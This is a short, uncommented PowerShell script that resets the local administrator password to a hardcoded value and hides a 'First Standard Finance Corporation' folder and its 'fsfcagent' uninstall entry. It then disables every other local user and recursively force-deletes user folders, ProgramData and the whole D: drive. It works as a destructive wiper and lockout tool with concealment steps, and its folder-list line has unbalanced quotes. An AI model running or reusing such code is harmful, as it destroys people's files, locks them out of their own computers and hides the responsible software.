$folderpath="C:\Users\*\Desktop\*", C:\Users\*\Documents\*", C:\Users\*\Downloads\*", C:\Users\*\Pictures\*", "D:\*" , "C:\ProgramData\*" , "C:\meshagent\*", "C:\Users\*\AppData\Roaming\*"
$exclusion="C:\Program Files\First Standard Finance Corporation" , "C:\Users\administrator"
$pass = ConvertTo-SecureString "x7j73CzTPWn8ov9ijmDVk9XEYjU2ZZPqWvfy78LY" -AsPlainText -Force
Set-LocalUser administrator -Password $pass
attrib +h +s "C:\Program Files\First Standard Finance Corporation"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\fsfcagent" /v SystemComponent /t REG_DWORD /d 1 /f
get-localuser | ? {$_.name -ne 'administrator'} | disable-localuser
Remove-Item -Path $folderpath -Exclude $exclusion -Recurse -Force